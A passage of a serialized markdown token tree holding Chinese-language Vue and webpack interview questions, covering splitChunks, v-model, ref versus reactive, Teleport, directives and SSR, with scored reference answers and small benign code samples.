相关）","escaped":false},{"type":"html","raw":"<br/>","inLink":false,"inRawBlock":false,"block":false,"text":"<br/>"},{"type":"text","raw":"\\n&emsp;原理：chunk是webpack在打包过程中生成的代码块。合理设置chunk的大小和数量可以更好地利用浏览器的缓存机制，减少重复请求，提高加载效率。如果chunk过\\n大，可能会导致加载时间过长；如果chunk过小，会产生过多的请求，增加请求开销。","text":"\\n&emsp;原理：chunk是webpack在打包过程中生成的代码块。合理设置chunk的大小和数量可以更好地利用浏览器的缓存机制，减少重复请求，提高加载效率。如果chunk过\\n大，可能会导致加载时间过长；如果chunk过小，会产生过多的请求，增加请求开销。","escaped":false},{"type":"html","raw":"<br/>","inLink":false,"inRawBlock":false,"block":false,"text":"<br/>"},{"type":"text","raw":"\\n&emsp;应用场景：根据应用的模块划分和功能需求来设置chunk。例如，可以将公共的库代码（如Vue、Vuex、Vue Router等）打包成一个单独的chunk，将不同业务模块\\n的代码分别打包成其他chunk。在webpack配置中，可以通过splitChunks配置项来控制chunk的生成，例如：","text":"\\n&emsp;应用场景：根据应用的模块划分和功能需求来设置chunk。例如，可以将公共的库代码（如Vue、Vuex、Vue Router等）打包成一个单独的chunk，将不同业务模块\\n的代码分别打包成其他chunk。在webpack配置中，可以通过splitChunks配置项来控制chunk的生成，例如：","escaped":false}]}]}]},{"type":"space","raw":"\\n\\n"},{"type":"code","raw":"```js\\nmodule.exports = {\\n  optimization: {\\n    splitChunks: {\\n      chunks: \'all\',\\n      minSize: 30000,\\n      maxSize: 0,\\n      minChunks: 1,\\n      maxAsyncRequests: 5,\\n      maxInitialRequests: 3,\\n      automaticNamePrefix: \'chunk - \',\\n      cacheGroups: {\\n        vendors: {\\n          test: /[\\\\\\\\/]node_modules[\\\\\\\\/]/,\\n          priority: - 10\\n        },\\n        default: {\\n          minChunks: 2,\\n          priority: - 20,\\n          reuseExistingChunk: true\\n        }\\n      }\\n    }\\n  }\\n};\\n```","lang":"js","text":"module.exports = {\\n  optimization: {\\n    splitChunks: {\\n      chunks: \'all\',\\n      minSize: 30000,\\n      maxSize: 0,\\n      minChunks: 1,\\n      maxAsyncRequests: 5,\\n      maxInitialRequests: 3,\\n      automaticNamePrefix: \'chunk - \',\\n      cacheGroups: {\\n        vendors: {\\n          test: /[\\\\\\\\/]node_modules[\\\\\\\\/]/,\\n          priority: - 10\\n        },\\n        default: {\\n          minChunks: 2,\\n          priority: - 20,\\n          reuseExistingChunk: true\\n        }\\n      }\\n    }\\n  }\\n};"},{"type":"space","raw":"\\n\\n"},{"type":"html","block":true,"raw":"</details>\\n\\n","pre":false,"text":"</details>\\n\\n"},{"type":"heading","raw":"## 8. v-model 双向绑定的原理是什么？\\n\\n","depth":2,"text":"8. v-model 双向绑定的原理是什么？","tokens":[{"type":"text","raw":"8. v-model 双向绑定的原理是什么？","text":"8. v-model 双向绑定的原理是什么？","escaped":false}]},{"type":"heading","raw":"#### 类型：`基础`\\n\\n","depth":4,"text":"类型：`基础`","tokens":[{"type":"text","raw":"类型：","text":"类型：","escaped":false},{"type":"codespan","raw":"`基础`","text":"基础"}]},{"type":"heading","raw":"#### 级别：`W1`、`W2`、`W3`、`W4`、`W5`、`W6`\\n\\n","depth":4,"text":"级别：`W1`、`W2`、`W3`、`W4`、`W5`、`W6`","tokens":[{"type":"text","raw":"级别：","text":"级别：","escaped":false},{"type":"codespan","raw":"`W1`","text":"W1"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W2`","text":"W2"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W3`","text":"W3"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W4`","text":"W4"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W5`","text":"W5"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W6`","text":"W6"}]},{"type":"heading","raw":"#### 解答（1分）\\n\\n","depth":4,"text":"解答（1分）","tokens":[{"type":"text","raw":"解答（1分）","text":"解答（1分）","escaped":false}]},{"type":"list","raw":"* **1：** v-model本质就是一个语法糖，可以看成是value + input方法的语法糖。 可以通过model属性的prop和event属性来进行自定义。原生的v-model，会根据标签的不同生成不同的事件和属性 。","ordered":false,"start":"","loose":false,"items":[{"type":"list_item","raw":"* **1：** v-model本质就是一个语法糖，可以看成是value + input方法的语法糖。 可以通过model属性的prop和event属性来进行自定义。原生的v-model，会根据标签的不同生成不同的事件和属性 。","task":false,"loose":false,"text":"**1：** v-model本质就是一个语法糖，可以看成是value + input方法的语法糖。 可以通过model属性的prop和event属性来进行自定义。原生的v-model，会根据标签的不同生成不同的事件和属性 。","tokens":[{"type":"text","raw":"**1：** v-model本质就是一个语法糖，可以看成是value + input方法的语法糖。 可以通过model属性的prop和event属性来进行自定义。原生的v-model，会根据标签的不同生成不同的事件和属性 。","text":"**1：** v-model本质就是一个语法糖，可以看成是value + input方法的语法糖。 可以通过model属性的prop和event属性来进行自定义。原生的v-model，会根据标签的不同生成不同的事件和属性 。","tokens":[{"type":"strong","raw":"**1：**","text":"1：","tokens":[{"type":"text","raw":"1：","text":"1：","escaped":false}]},{"type":"text","raw":" v-model本质就是一个语法糖，可以看成是value + input方法的语法糖。 可以通过model属性的prop和event属性来进行自定义。原生的v-model，会根据标签的不同生成不同的事件和属性 。","text":" v-model本质就是一个语法糖，可以看成是value + input方法的语法糖。 可以通过model属性的prop和event属性来进行自定义。原生的v-model，会根据标签的不同生成不同的事件和属性 。","escaped":false}]}]}]},{"type":"space","raw":"\\n\\n"},{"type":"heading","raw":"## 9. 在v-if 和 v-for 的优先级哪个高？\\n\\n","depth":2,"text":"9. 在v-if 和 v-for 的优先级哪个高？","tokens":[{"type":"text","raw":"9. 在v-if 和 v-for 的优先级哪个高？","text":"9. 在v-if 和 v-for 的优先级哪个高？","escaped":false}]},{"type":"heading","raw":"#### 类型：`基础`\\n\\n","depth":4,"text":"类型：`基础`","tokens":[{"type":"text","raw":"类型：","text":"类型：","escaped":false},{"type":"codespan","raw":"`基础`","text":"基础"}]},{"type":"heading","raw":"#### 级别：`W1`、`W2`、`W3`、`W4`、`W5`、`W6`\\n\\n","depth":4,"text":"级别：`W1`、`W2`、`W3`、`W4`、`W5`、`W6`","tokens":[{"type":"text","raw":"级别：","text":"级别：","escaped":false},{"type":"codespan","raw":"`W1`","text":"W1"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W2`","text":"W2"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W3`","text":"W3"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W4`","text":"W4"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W5`","text":"W5"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W6`","text":"W6"}]},{"type":"heading","raw":"#### 解答（1分）\\n\\n","depth":4,"text":"解答（1分）","tokens":[{"type":"text","raw":"解答（1分）","text":"解答（1分）","escaped":false}]},{"type":"list","raw":"* **1：** 在 vue2 中 v-for 的优先级更高，但是在 vue3 中优先级改变了。v-if 的优先级更高。","ordered":false,"start":"","loose":false,"items":[{"type":"list_item","raw":"* **1：** 在 vue2 中 v-for 的优先级更高，但是在 vue3 中优先级改变了。v-if 的优先级更高。","task":false,"loose":false,"text":"**1：** 在 vue2 中 v-for 的优先级更高，但是在 vue3 中优先级改变了。v-if 的优先级更高。","tokens":[{"type":"text","raw":"**1：** 在 vue2 中 v-for 的优先级更高，但是在 vue3 中优先级改变了。v-if 的优先级更高。","text":"**1：** 在 vue2 中 v-for 的优先级更高，但是在 vue3 中优先级改变了。v-if 的优先级更高。","tokens":[{"type":"strong","raw":"**1：**","text":"1：","tokens":[{"type":"text","raw":"1：","text":"1：","escaped":false}]},{"type":"text","raw":" 在 vue2 中 v-for 的优先级更高，但是在 vue3 中优先级改变了。v-if 的优先级更高。","text":" 在 vue2 中 v-for 的优先级更高，但是在 vue3 中优先级改变了。v-if 的优先级更高。","escaped":false}]}]}]},{"type":"space","raw":"\\n\\n"},{"type":"heading","raw":"## 10. ref与reactive的区别？\\n\\n","depth":2,"text":"10. ref与reactive的区别？","tokens":[{"type":"text","raw":"10. ref与reactive的区别？","text":"10. ref与reactive的区别？","escaped":false}]},{"type":"heading","raw":"#### 类型：`基础`\\n\\n","depth":4,"text":"类型：`基础`","tokens":[{"type":"text","raw":"类型：","text":"类型：","escaped":false},{"type":"codespan","raw":"`基础`","text":"基础"}]},{"type":"heading","raw":"#### 级别：`W1`、`W2`、`W3`、`W4`、`W5`、`W6`\\n\\n","depth":4,"text":"级别：`W1`、`W2`、`W3`、`W4`、`W5`、`W6`","tokens":[{"type":"text","raw":"级别：","text":"级别：","escaped":false},{"type":"codespan","raw":"`W1`","text":"W1"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W2`","text":"W2"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W3`","text":"W3"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W4`","text":"W4"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W5`","text":"W5"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W6`","text":"W6"}]},{"type":"heading","raw":"#### 解答（6分）\\n\\n","depth":4,"text":"解答（6分）","tokens":[{"type":"text","raw":"解答（6分）","text":"解答（6分）","escaped":false}]},{"type":"list","raw":"* **1：** ref与reactive 是 Vue3 新推出的主要 API 之一，它们主要用于响应式数据的创建。\\n* **1：** ref 函数创建的响应式数据，在模板中可以直接被使用，在 JS 中需要通过 .value 的形式才能使用。\\n* **1：** ref 函数可以接收原始数据类型与引用数据类型。\\n* **1：** reactive 函数只能接收引用数据类型。\\n* **1：** ref 底层还是使用 reactive 来做，ref 是在 reactive 上在进行了封装，增强了其能力，使它支持了对原始数据类型的处理。\\n* **1：** 在 Vue3 中 reactive 能做的，ref 也能做，reactive 不能做的，ref 也能做。","ordered":false,"start":"","loose":false,"items":[{"type":"list_item","raw":"* **1：** ref与reactive 是 Vue3 新推出的主要 API 之一，它们主要用于响应式数据的创建。\\n","task":false,"loose":false,"text":"**1：** ref与reactive 是 Vue3 新推出的主要 API 之一，它们主要用于响应式数据的创建。","tokens":[{"type":"text","raw":"**1：** ref与reactive 是 Vue3 新推出的主要 API 之一，它们主要用于响应式数据的创建。","text":"**1：** ref与reactive 是 Vue3 新推出的主要 API 之一，它们主要用于响应式数据的创建。","tokens":[{"type":"strong","raw":"**1：**","text":"1：","tokens":[{"type":"text","raw":"1：","text":"1：","escaped":false}]},{"type":"text","raw":" ref与reactive 是 Vue3 新推出的主要 API 之一，它们主要用于响应式数据的创建。","text":" ref与reactive 是 Vue3 新推出的主要 API 之一，它们主要用于响应式数据的创建。","escaped":false}]}]},{"type":"list_item","raw":"* **1：** ref 函数创建的响应式数据，在模板中可以直接被使用，在 JS 中需要通过 .value 的形式才能使用。\\n","task":false,"loose":false,"text":"**1：** ref 函数创建的响应式数据，在模板中可以直接被使用，在 JS 中需要通过 .value 的形式才能使用。","tokens":[{"type":"text","raw":"**1：** ref 函数创建的响应式数据，在模板中可以直接被使用，在 JS 中需要通过 .value 的形式才能使用。","text":"**1：** ref 函数创建的响应式数据，在模板中可以直接被使用，在 JS 中需要通过 .value 的形式才能使用。","tokens":[{"type":"strong","raw":"**1：**","text":"1：","tokens":[{"type":"text","raw":"1：","text":"1：","escaped":false}]},{"type":"text","raw":" ref 函数创建的响应式数据，在模板中可以直接被使用，在 JS 中需要通过 .value 的形式才能使用。","text":" ref 函数创建的响应式数据，在模板中可以直接被使用，在 JS 中需要通过 .value 的形式才能使用。","escaped":false}]}]},{"type":"list_item","raw":"* **1：** ref 函数可以接收原始数据类型与引用数据类型。\\n","task":false,"loose":false,"text":"**1：** ref 函数可以接收原始数据类型与引用数据类型。","tokens":[{"type":"text","raw":"**1：** ref 函数可以接收原始数据类型与引用数据类型。","text":"**1：** ref 函数可以接收原始数据类型与引用数据类型。","tokens":[{"type":"strong","raw":"**1：**","text":"1：","tokens":[{"type":"text","raw":"1：","text":"1：","escaped":false}]},{"type":"text","raw":" ref 函数可以接收原始数据类型与引用数据类型。","text":" ref 函数可以接收原始数据类型与引用数据类型。","escaped":false}]}]},{"type":"list_item","raw":"* **1：** reactive 函数只能接收引用数据类型。\\n","task":false,"loose":false,"text":"**1：** reactive 函数只能接收引用数据类型。","tokens":[{"type":"text","raw":"**1：** reactive 函数只能接收引用数据类型。","text":"**1：** reactive 函数只能接收引用数据类型。","tokens":[{"type":"strong","raw":"**1：**","text":"1：","tokens":[{"type":"text","raw":"1：","text":"1：","escaped":false}]},{"type":"text","raw":" reactive 函数只能接收引用数据类型。","text":" reactive 函数只能接收引用数据类型。","escaped":false}]}]},{"type":"list_item","raw":"* **1：** ref 底层还是使用 reactive 来做，ref 是在 reactive 上在进行了封装，增强了其能力，使它支持了对原始数据类型的处理。\\n","task":false,"loose":false,"text":"**1：** ref 底层还是使用 reactive 来做，ref 是在 reactive 上在进行了封装，增强了其能力，使它支持了对原始数据类型的处理。","tokens":[{"type":"text","raw":"**1：** ref 底层还是使用 reactive 来做，ref 是在 reactive 上在进行了封装，增强了其能力，使它支持了对原始数据类型的处理。","text":"**1：** ref 底层还是使用 reactive 来做，ref 是在 reactive 上在进行了封装，增强了其能力，使它支持了对原始数据类型的处理。","tokens":[{"type":"strong","raw":"**1：**","text":"1：","tokens":[{"type":"text","raw":"1：","text":"1：","escaped":false}]},{"type":"text","raw":" ref 底层还是使用 reactive 来做，ref 是在 reactive 上在进行了封装，增强了其能力，使它支持了对原始数据类型的处理。","text":" ref 底层还是使用 reactive 来做，ref 是在 reactive 上在进行了封装，增强了其能力，使它支持了对原始数据类型的处理。","escaped":false}]}]},{"type":"list_item","raw":"* **1：** 在 Vue3 中 reactive 能做的，ref 也能做，reactive 不能做的，ref 也能做。","task":false,"loose":false,"text":"**1：** 在 Vue3 中 reactive 能做的，ref 也能做，reactive 不能做的，ref 也能做。","tokens":[{"type":"text","raw":"**1：** 在 Vue3 中 reactive 能做的，ref 也能做，reactive 不能做的，ref 也能做。","text":"**1：** 在 Vue3 中 reactive 能做的，ref 也能做，reactive 不能做的，ref 也能做。","tokens":[{"type":"strong","raw":"**1：**","text":"1：","tokens":[{"type":"text","raw":"1：","text":"1：","escaped":false}]},{"type":"text","raw":" 在 Vue3 中 reactive 能做的，ref 也能做，reactive 不能做的，ref 也能做。","text":" 在 Vue3 中 reactive 能做的，ref 也能做，reactive 不能做的，ref 也能做。","escaped":false}]}]}]},{"type":"space","raw":"\\n\\n"},{"type":"heading","raw":"## 11. Vue 3 中的Teleport功能有什么作用，如何使用？\\n\\n","depth":2,"text":"11. Vue 3 中的Teleport功能有什么作用，如何使用？","tokens":[{"type":"text","raw":"11. Vue 3 中的Teleport功能有什么作用，如何使用？","text":"11. Vue 3 中的Teleport功能有什么作用，如何使用？","escaped":false}]},{"type":"heading","raw":"#### 类型：`基础`\\n\\n","depth":4,"text":"类型：`基础`","tokens":[{"type":"text","raw":"类型：","text":"类型：","escaped":false},{"type":"codespan","raw":"`基础`","text":"基础"}]},{"type":"heading","raw":"#### 级别：`W1`、`W2`、`W3`、`W4`、`W5`、`W6`\\n\\n","depth":4,"text":"级别：`W1`、`W2`、`W3`、`W4`、`W5`、`W6`","tokens":[{"type":"text","raw":"级别：","text":"级别：","escaped":false},{"type":"codespan","raw":"`W1`","text":"W1"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W2`","text":"W2"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W3`","text":"W3"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W4`","text":"W4"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W5`","text":"W5"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W6`","text":"W6"}]},{"type":"heading","raw":"#### 解答（2分）\\n\\n","depth":4,"text":"解答（2分）","tokens":[{"type":"text","raw":"解答（2分）","text":"解答（2分）","escaped":false}]},{"type":"list","raw":"* **2：** Teleport功能可以将组件的子树 “瞬移” 到 DOM 的其他位置，不受组件层级的限制。使用时，在组件中使用 `<teleport>` 标签包裹需要瞬移的元素，并\\n指定to属性为目标 DOM 元素的选择器或id。例如:","ordered":false,"start":"","loose":false,"items":[{"type":"list_item","raw":"* **2：** Teleport功能可以将组件的子树 “瞬移” 到 DOM 的其他位置，不受组件层级的限制。使用时，在组件中使用 `<teleport>` 标签包裹需要瞬移的元素，并\\n指定to属性为目标 DOM 元素的选择器或id。例如:","task":false,"loose":false,"text":"**2：** Teleport功能可以将组件的子树 “瞬移” 到 DOM 的其他位置，不受组件层级的限制。使用时，在组件中使用 `<teleport>` 标签包裹需要瞬移的元素，并\\n指定to属性为目标 DOM 元素的选择器或id。例如:","tokens":[{"type":"text","raw":"**2：** Teleport功能可以将组件的子树 “瞬移” 到 DOM 的其他位置，不受组件层级的限制。使用时，在组件中使用 `<teleport>` 标签包裹需要瞬移的元素，并\\n\\n指定to属性为目标 DOM 元素的选择器或id。例如:","text":"**2：** Teleport功能可以将组件的子树 “瞬移” 到 DOM 的其他位置，不受组件层级的限制。使用时，在组件中使用 `<teleport>` 标签包裹需要瞬移的元素，并\\n指定to属性为目标 DOM 元素的选择器或id。例如:","tokens":[{"type":"strong","raw":"**2：**","text":"2：","tokens":[{"type":"text","raw":"2：","text":"2：","escaped":false}]},{"type":"text","raw":" Teleport功能可以将组件的子树 “瞬移” 到 DOM 的其他位置，不受组件层级的限制。使用时，在组件中使用 ","text":" Teleport功能可以将组件的子树 “瞬移” 到 DOM 的其他位置，不受组件层级的限制。使用时，在组件中使用 ","escaped":false},{"type":"codespan","raw":"`<teleport>`","text":"<teleport>"},{"type":"text","raw":" 标签包裹需要瞬移的元素，并\\n指定to属性为目标 DOM 元素的选择器或id。例如:","text":" 标签包裹需要瞬移的元素，并\\n指定to属性为目标 DOM 元素的选择器或id。例如:","escaped":false}]}]}]},{"type":"space","raw":"\\n\\n"},{"type":"code","raw":"```js\\n<teleport to=\\"#app-root\\">...</teleport>\\n//会将包裹的元素移动到id为app-root的元素内部。\\n```","lang":"js","text":"<teleport to=\\"#app-root\\">...</teleport>\\n//会将包裹的元素移动到id为app-root的元素内部。"},{"type":"space","raw":"\\n\\n"},{"type":"heading","raw":"## 12. 如何在 Vue 3 中实现自定义指令的全局注册和局部注册？\\n\\n","depth":2,"text":"12. 如何在 Vue 3 中实现自定义指令的全局注册和局部注册？","tokens":[{"type":"text","raw":"12. 如何在 Vue 3 中实现自定义指令的全局注册和局部注册？","text":"12. 如何在 Vue 3 中实现自定义指令的全局注册和局部注册？","escaped":false}]},{"type":"heading","raw":"#### 类型：`基础`\\n\\n","depth":4,"text":"类型：`基础`","tokens":[{"type":"text","raw":"类型：","text":"类型：","escaped":false},{"type":"codespan","raw":"`基础`","text":"基础"}]},{"type":"heading","raw":"#### 级别：`W1`、`W2`、`W3`、`W4`、`W5`、`W6`\\n\\n","depth":4,"text":"级别：`W1`、`W2`、`W3`、`W4`、`W5`、`W6`","tokens":[{"type":"text","raw":"级别：","text":"级别：","escaped":false},{"type":"codespan","raw":"`W1`","text":"W1"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W2`","text":"W2"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W3`","text":"W3"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W4`","text":"W4"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W5`","text":"W5"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W6`","text":"W6"}]},{"type":"heading","raw":"#### 解答（1分）\\n\\n","depth":4,"text":"解答（1分）","tokens":[{"type":"text","raw":"解答（1分）","text":"解答（1分）","escaped":false}]},{"type":"list","raw":"* **1：** 全局注册在 main.js 中使用 app.directive(\'指令名\', 指令对象)；局部注册在组件内，通过 directives: { \'指令名\': 指令对象 }，指令对象包含\\n mounted、updated 等生命周期钩子函数用于定义指令行为。","ordered":false,"start":"","loose":false,"items":[{"type":"list_item","raw":"* **1：** 全局注册在 main.js 中使用 app.directive(\'指令名\', 指令对象)；局部注册在组件内，通过 directives: { \'指令名\': 指令对象 }，指令对象包含\\n mounted、updated 等生命周期钩子函数用于定义指令行为。","task":false,"loose":false,"text":"**1：** 全局注册在 main.js 中使用 app.directive(\'指令名\', 指令对象)；局部注册在组件内，通过 directives: { \'指令名\': 指令对象 }，指令对象包含\\n mounted、updated 等生命周期钩子函数用于定义指令行为。","tokens":[{"type":"text","raw":"**1：** 全局注册在 main.js 中使用 app.directive(\'指令名\', 指令对象)；局部注册在组件内，通过 directives: { \'指令名\': 指令对象 }，指令对象包含\\n\\n mounted、updated 等生命周期钩子函数用于定义指令行为。","text":"**1：** 全局注册在 main.js 中使用 app.directive(\'指令名\', 指令对象)；局部注册在组件内，通过 directives: { \'指令名\': 指令对象 }，指令对象包含\\n mounted、updated 等生命周期钩子函数用于定义指令行为。","tokens":[{"type":"strong","raw":"**1：**","text":"1：","tokens":[{"type":"text","raw":"1：","text":"1：","escaped":false}]},{"type":"text","raw":" 全局注册在 main.js 中使用 app.directive(\'指令名\', 指令对象)；局部注册在组件内，通过 directives: { \'指令名\': 指令对象 }，指令对象包含\\n mounted、updated 等生命周期钩子函数用于定义指令行为。","text":" 全局注册在 main.js 中使用 app.directive(\'指令名\', 指令对象)；局部注册在组件内，通过 directives: { \'指令名\': 指令对象 }，指令对象包含\\n mounted、updated 等生命周期钩子函数用于定义指令行为。","escaped":false}]}]}]},{"type":"space","raw":"\\n\\n"},{"type":"heading","raw":"## 13. 说一下 Vue SSR 的实现原理\\n\\n","depth":2,"text":"13. 说一下 Vue SSR 的实现原理","tokens":[{"type":"text","raw":"13. 说一下 Vue SSR 的实现原理","text":"13. 说一下 Vue SSR 的实现原理","escaped":false}]},{"type":"heading","raw":"#### 类型：`基础`\\n\\n","depth":4,"text":"类型：`基础`","tokens":[{"type":"text","raw":"类型：","text":"类型：","escaped":false},{"type":"codespan","raw":"`基础`","text":"基础"}]},{"type":"heading","raw":"#### 级别：`W1`、`W2`、`W3`、`W4`、`W5`、`W6`\\n\\n","depth":4,"text":"级别：`W1`、`W2`、`W3`、`W4`、`W5`、`W6`","tokens":[{"type":"text","raw":"级别：","text":"级别：","escaped":false},{"type":"codespan","raw":"`W1`","text":"W1"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W2`","text":"W2"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W3`","text":"W3"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W4`","text":"W4"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W5`","text":"W5"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W6`","text":"W6"}]},{"type":"heading","raw":"#### 解答（2 分）\\n\\n","depth":4,"text":"解答（2 分）","tokens":[{"type":"text","raw":"解答（2 分）","text":"解答（2 分）","escaped":false}]},{"type":"list","raw":"* SSR也就是服务端渲染，也就是将Vue在客户端把标签渲染成HTML的工作放在服务端完成，然后再把html直接返回给客户端。\\n\\n* SSR有着更好的SEO、并且首屏加载速度更快等优点。不过它也有一些缺点，比如我们的开发条件会受到限制，服务器端渲染只支持beforeCreate和created两个钩子，当我们需要一些外部扩展库时需要特殊处理，服务端渲染应用程序也需要处于Node.js的运行环境。还有就是服务器会有更大的负载需求。","ordered":false,"start":"","loose":true,"items":[{"type":"list_item","raw":"* SSR也就是服务端渲染，也就是将Vue在客户端把标签渲染成HTML的工作放在服务端完成，然后再把html直接返回给客户端。\\n\\n","task":false,"loose":true,"text":"SSR也就是服务端渲染，也就是将Vue在客户端把标签渲染成HTML的工作放在服务端完成，然后再把html直接返回给客户端。\\n","tokens":[{"type":"text","raw":"SSR也就是服务端渲染，也就是将Vue在客户端把标签渲染成HTML的工作放在服务端完成，然后再把html直接返回给客户端。\\n","text":"SSR也就是服务端渲染，也就是将Vue在客户端把标签渲染成HTML的工作放在服务端完成，然后再把html直接返回给客户端。","tokens":[{"type":"text","raw":"SSR也就是服务端渲染，也就是将Vue在客户端把标签渲染成HTML的工作放在服务端完成，然后再把html直接返回给客户端。","text":"SSR也就是服务端渲染，也就是将Vue在客户端把标签渲染成HTML的工作放在服务端完成，然后再把html直接返回给客户端。","escaped":false}]}]},{"type":"list_item","raw":"* SSR有着更好的SEO、并且首屏加载速度更快等优点。不过它也有一些缺点，比如我们的开发条件会受到限制，服务器端渲染只支持beforeCreate和created两个钩子，当我们需要一些外部扩展库时需要特殊处理，服务端渲染应用程序也需要处于Node.js的运行环境。还有就是服务器会有更大的负载需求。","task":false,"loose":true,"text":"SSR有着更好的SEO、并且首屏加载速度更快等优点。不过它也有一些缺点，比如我们的开发条件会受到限制，服务器端渲染只支持beforeCreate和created两个钩子，当我们需要一些外部扩展库时需要特殊处理，服务端渲染应用程序也需要处于Node.js的运行环境。还有就是服务器会有更大的负载需求。","tokens":[{"type":"text","raw":"SSR有着更好的SEO、并且首屏加载速度更快等优点。不过它也有一些缺点，比如我们的开发条件会受到限制，服务器端渲染只支持beforeCreate和created两个钩子，当我们需要一些外部扩展库时需要特殊处理，服务端渲染应用程序也需要处于Node.js的运行环境。还有就是服务器会有更大的负载需求。","text":"SSR有着更好的SEO、并且首屏加载速度更快等优点。不过它也有一些缺点，比如我们的开发条件会受到限制，服务器端渲染只支持beforeCreate和created两个钩子，当我们需要一些外部扩展库时需要特殊处理，服务端渲染应用程序也需要处于Node.js的运行环境。还有就是服务器会有更大的负载需求。","tokens":[{"type":"text","raw":"SSR有着更好的SEO、并且首屏加载速度更快等优点。不过它也有一些缺点，比如我们的开发条件会受到限制，服务器端渲染只支持beforeCreate和created两个钩子，当我们需要一些外部扩展库时需要特殊处理，服务端渲染应用程序也需要处于Node.js的运行环境。还有就是服务器会有更大的负载需求。","text":"SSR有着更好的SEO、并且首屏加载速度更快等优点。不过它也有一些缺点，比如我们的开发条件会受到限制，服务器端渲染只支持beforeCreate和created两个钩子，当我们需要一些外部扩展库时需要特殊处理，服务端渲染应用程序也需要处于Node.js的运行环境。还有就是服务器会有更大的负载需求。","escaped":false}]}]}]},{"type":"space","raw":"\\n\\n"},{"type":"heading","raw":"## 14. Vue 组件的 data 为什么必须是函数？\\n\\n","depth":2,"text":"14. Vue 组件的 data 为什么必须是函数？","tokens":[{"type":"text","raw":"14. Vue 组件的 data 为什么必须是函数？","text":"14. Vue 组件的 data 为什么必须是函数？","escaped":false}]},{"type":"heading","raw":"#### 类型：`基础`\\n\\n","depth":4,"text":"类型：`基础`","tokens":[{"type":"text","raw":"类型：","text":"类型：","escaped":false},{"type":"codespan","raw":"`基础`","text":"基础"}]},{"type":"heading","raw":"#### 级别：`W1`、`W2`、`W3`、`W4`、`W5`、`W6`\\n\\n","depth":4,"text":"级别：`W1`、`W2`、`W3`、`W4`、`W5`、`W6`","tokens":[{"type":"text","raw":"级别：","text":"级别：","escaped":false},{"type":"codespan","raw":"`W1`","text":"W1"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W2`","text":"W2"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W3`","text":"W3"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W4`","text":"W4"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W5`","text":"W5"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W6`","text":"W6"}]},{"type":"heading","raw":"#### 解答（2 分）\\n\\n","depth":4,"text":"解答（2 分）","tokens":[{"type":"text","raw":"解答（2 分）","text":"解答（2 分）","escaped":false}]},{"type":"list","raw":"* 一个组件被复用多次的话，也就会创建多个实例。本质上，这些实例用的都是同一个构造函数。如果data是对象的话，对象属于引用类型，会影响到所有的实例。所以为了保证组件不同的实例之间data不冲突，data必须是一个函数。","ordered":false,"start":"","loose":false,"items":[{"type":"list_item","raw":"* 一个组件被复用多次的话，也就会创建多个实例。本质上，这些实例用的都是同一个构造函数。如果data是对象的话，对象属于引用类型，会影响到所有的实例。所以为了保证组件不同的实例之间data不冲突，data必须是一个函数。","task":false,"loose":false,"text":"一个组件被复用多次的话，也就会创建多个实例。本质上，这些实例用的都是同一个构造函数。如果data是对象的话，对象属于引用类型，会影响到所有的实例。所以为了保证组件不同的实例之间data不冲突，data必须是一个函数。","tokens":[{"type":"text","raw":"一个组件被复用多次的话，也就会创建多个实例。本质上，这些实例用的都是同一个构造函数。如果data是对象的话，对象属于引用类型，会影响到所有的实例。所以为了保证组件不同的实例之间data不冲突，data必须是一个函数。","text":"一个组件被复用多次的话，也就会创建多个实例。本质上，这些实例用的都是同一个构造函数。如果data是对象的话，对象属于引用类型，会影响到所有的实例。所以为了保证组件不同的实例之间data不冲突，data必须是一个函数。","tokens":[{"type":"text","raw":"一个组件被复用多次的话，也就会创建多个实例。本质上，这些实例用的都是同一个构造函数。如果data是对象的话，对象属于引用类型，会影响到所有的实例。所以为了保证组件不同的实例之间data不冲突，data必须是一个函数。","text":"一个组件被复用多次的话，也就会创建多个实例。本质上，这些实例用的都是同一个构造函数。如果data是对象的话，对象属于引用类型，会影响到所有的实例。所以为了保证组件不同的实例之间data不冲突，data必须是一个函数。","escaped":false}]}]}]},{"type":"space","raw":"\\n\\n"},{"type":"heading","raw":"## 